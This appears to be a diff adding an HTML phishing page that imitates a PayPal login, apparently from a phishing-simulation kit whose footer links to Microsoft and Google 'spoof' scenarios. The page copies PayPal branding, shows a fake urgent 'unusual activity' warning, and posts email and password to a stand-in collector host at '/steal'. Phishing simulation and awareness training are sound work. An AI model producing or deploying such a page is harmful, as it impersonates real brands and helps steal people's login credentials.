@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PayPal: Log In to Your Account - Secure Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f5f7fa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-container {
+      background: #fff;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      width: 350px;
+      text-align: center;
+    }
+    .logo {
+      font-size: 32px;
+      font-weight: bold;
+      color: #003087;
+      margin-bottom: 25px;
+    }
+    .logo span {
+      color: #0079c1;
+    }
+    h2 {
+      font-size: 18px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+      font-size: 14px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #0070ba;
+      color: white;
+      border: none;
+      border-radius: 20px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #003087;
+    }
+    .warning {
+      color: #c00;
+      font-size: 12px;
+      margin-top: 15px;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo">Pay<span>Pal</span></div>
+    <h2>Log in to your PayPal account</h2>
+    <form action="http://fake-collector.example.com/steal" method="POST">
+      <input type="text" placeholder="Email or mobile number" required />
+      <input type="password" placeholder="Enter your password" required />
+      <button type="submit">Log In</button>
+    </form>
+    <div class="warning">⚠️ Urgent: Unusual activity detected. Verify credentials now.</div>
+    <div style="margin-top: 25px; border-top: 1px solid #eee; padding-top: 15px; font-size: 13px;">
+      <strong>Switch Test Scenarios:</strong><br/>
+      <a href="/microsoft.html" style="color: #0067b8; text-decoration: none; margin-right: 12px;">Microsoft Account Spoof</a> |
+      <a href="/google.html" style="color: #0b57d0; text-decoration: none; margin-left: 12px;">Google Account Spoof</a>
+    </div>
+  </div>
+</body>
+</html>
